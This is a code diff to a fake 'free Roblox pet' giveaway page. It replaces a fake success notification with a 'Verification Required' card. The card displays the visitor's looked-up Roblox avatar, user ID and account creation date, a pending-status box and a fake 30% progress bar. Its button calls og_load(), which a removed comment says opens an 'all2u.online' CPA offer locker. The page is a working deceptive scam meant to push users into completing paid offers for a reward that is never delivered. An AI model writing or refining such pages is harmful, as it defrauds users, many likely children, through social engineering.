@@ -271,33 +271,64 @@ select {
   to   { opacity: 1; transform: translateY(0); }
 }
 
-/* ===== TOAST NOTIFICATION ===== */
-.toast-notification {
-  position: fixed;
-  top: -100px; /* مخفي في البداية */
-  left: 50%;
-  transform: translateX(-50%);
-  width: max-content;
-  max-width: 90vw;
-  background: var(--surface);
-  color: var(--ink);
+/* ===== CPA VERIFICATION STYLES ===== */
+.cpa-warning {
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  padding: 12px; background: #fef3c7; color: #92400e;
+  border-radius: 8px; font-weight: 600; font-size: 13px;
+  margin-bottom: 16px; border: 1px solid #fcd34d; text-align: center;
+}
+.cpa-card {
+  background: var(--surface); border: 1px solid var(--line);
+  border-radius: 14px; padding: 20px 16px; text-align: center;
+}
+.cpa-card h3 { font-family: var(--font-display); font-size: 1.3rem; margin: 0 0 4px; }
+.cpa-card p { color: var(--muted); font-size: 13px; margin: 0 0 20px; }
+.cpa-avatar-wrap {
+  position: relative; width: 100px; height: 100px; margin: 0 auto 20px;
+}
+.cpa-avatar-wrap img {
+  width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
+  border: 4px solid var(--ok); box-shadow: 0 4px 12px rgba(34, 160, 107, 0.3);
+}
+.cpa-badge {
+  position: absolute; bottom: -5px; right: -15px;
+  background: var(--ok); color: #fff; padding: 4px 10px;
+  border-radius: 999px; font-weight: 700; font-size: 11px;
+  display: flex; align-items: center; gap: 4px; border: 2px solid var(--surface);
+}
+.cpa-name { font-size: 1.1rem; font-weight: 700; margin: 0 0 16px; }
+.cpa-data-row { display: flex; gap: 10px; margin-bottom: 16px; text-align: left; }
+.cpa-data-box {
+  flex: 1; background: var(--bg); padding: 10px; border-radius: 8px;
   border: 1px solid var(--line);
-  border-left: 4px solid var(--ok);
-  box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-  border-radius: 8px;
-  padding: 16px;
-  display: flex;
-  align-items: flex-start;
-  gap: 12px;
-  z-index: 100;
-  transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
 }
-.toast-notification.show {
-  top: max(20px, env(safe-area-inset-top, 20px));
+.cpa-data-box span { display: block; font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; font-weight: 600; margin-bottom: 4px; }
+.cpa-data-box strong { display: block; font-family: var(--font-mono); font-size: 13px; color: var(--ink); }
+.cpa-status {
+  background: #fef3c7; border: 1px solid #fcd34d; border-radius: 8px;
+  padding: 12px; text-align: left; margin-bottom: 20px;
 }
-.toast-icon { font-size: 20px; line-height: 1; }
-.toast-content h4 { margin: 0 0 4px; font-family: var(--font-display); font-size: 14px; color: var(--ok); }
-.toast-content p { margin: 0; font-size: 13px; color: var(--muted); line-height: 1.4; }
+.cpa-status .row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 12px; color: #92400e; font-weight: 600; }
+.cpa-status .row:last-child { margin-bottom: 0; }
+.cpa-status .val { color: var(--ok); }
+.cpa-status .pend { color: #b45309; }
+.cpa-btn {
+  display: block; width: 100%; background: var(--ok); color: #fff;
+  text-decoration: none; padding: 16px; border-radius: 10px;
+  font-family: var(--font-display); font-weight: 700; font-size: 1rem;
+  letter-spacing: .05em; text-transform: uppercase; cursor: pointer;
+  border: none; box-shadow: 0 4px 14px rgba(34, 160, 107, 0.4);
+  transition: transform .15s ease;
+}
+.cpa-btn:hover { transform: scale(1.02); }
+.cpa-progress-bg {
+  height: 8px; background: var(--line); border-radius: 999px; margin: 16px 0 8px; overflow: hidden;
+}
+.cpa-progress-bar {
+  height: 100%; width: 30%; background: var(--warn); border-radius: 999px;
+}
+.cpa-hint { font-size: 11px; color: var(--muted); text-align: center; margin-bottom: 16px; }
 
 @media (prefers-reduced-motion: reduce) {
   .card { transition: none; }
@@ -305,15 +336,6 @@ select {
   .step, .profile { animation: none; opacity: 1; transform: none; }
 }
 </style>
-
-<!-- صندوق الإشعار (مخفي في البداية) -->
-<div id="toast" class="toast-notification">
-  <div class="toast-icon">✅</div>
-  <div class="toast-content">
-    <h4>Success!</h4>
-    <p id="toastMsg">Your pet has been sent.</p>
-  </div>
-</div>
 
 <div class="wrap">
   <header>
@@ -634,19 +656,6 @@ async function lookupUser(username) {
   return j;
 }
 
-function showToast(petName) {
-  const toast = $("toast");
-  const toastMsg = $("toastMsg");
-  
-  toastMsg.innerHTML = 'Success! Your new pet <b>' + escapeHtml(petName) + '</b> has been sent to your Roblox egg collection. Enjoy!';
-  
-  toast.classList.add("show");
-  
-  setTimeout(() => {
-    toast.classList.remove("show");
-  }, 5000);
-}
-
 async function runClaim() {
   if (claimBusy) return;
   const input = $("claimUser");
@@ -714,20 +723,45 @@ async function runClaim() {
     el.querySelector(".icon").textContent = "✓";
   }
 
-  // 1. Show the top notification
   const cardName = (DATA.find(x => x.id === openId) || {}).name || "Item";
-  showToast(cardName);
-  
+  const createdDate = profile.created ? new Date(profile.created).toLocaleDateString("en-US") : "Unknown";
+
+  stage.innerHTML = 
+    '<div class="cpa-warning">⚠️ Waiting for offer completion...</div>' +
+    '<div class="cpa-card">' +
+      '<h3>Verification Required</h3>' +
+      '<p>Complete the offer to receive your <b>' + escapeHtml(cardName) + '</b></p>' +
+      
+      '<div class="cpa-avatar-wrap">' +
+        '<img src="' + escapeHtml(profile.imageUrl) + '" alt="Avatar" onerror="this.src=\'https://via.placeholder.com/150\'">' +
+        '<div class="cpa-badge">🎁 1x ' + escapeHtml(cardName) + '</div>' +
+      '</div>' +
+      
+      '<p class="cpa-name">' + escapeHtml(profile.name) + '</p>' +
+      
+      '<div class="cpa-data-row">' +
+        '<div class="cpa-data-box">' +
+          '<span>User ID</span>' +
+          '<strong>' + escapeHtml(String(profile.id)) + '</strong>' +
+        '</div>' +
+        '<div class="cpa-data-box">' +
+          '<span>Created On</span>' +
+          '<strong>' + escapeHtml(createdDate) + '</strong>' +
+        '</div>' +
+      '</div>' +
+      
+      '<div class="cpa-status">' +
+        '<div class="row"><span>Item Ready:</span> <span class="val">1x ' + escapeHtml(cardName) + '</span></div>' +
+        '<div class="row"><span>Status:</span> <span class="pend">Pending Verification</span></div>' +
+      '</div>' +
+      
+      '<button onclick="og_load()" class="cpa-btn">THE OFFER</button>' +
+      
+      '<div class="cpa-progress-bg"><div class="cpa-progress-bar"></div></div>' +
+      '<p class="cpa-hint">30% - Click the button to start the verification process.</p>' +
+    '</div>';
+    
   claimBusy = false;
-  
-  // 2. Trigger the CPA Locker after 1.5 seconds
-  setTimeout(() => {
-    if (typeof og_load === 'function') {
-      og_load(); // This opens the all2u.online locker
-    } else {
-      console.error("Locker script not loaded yet.");
-    }
-  }, 1500);
 }
 
 grid.addEventListener("click", e => {
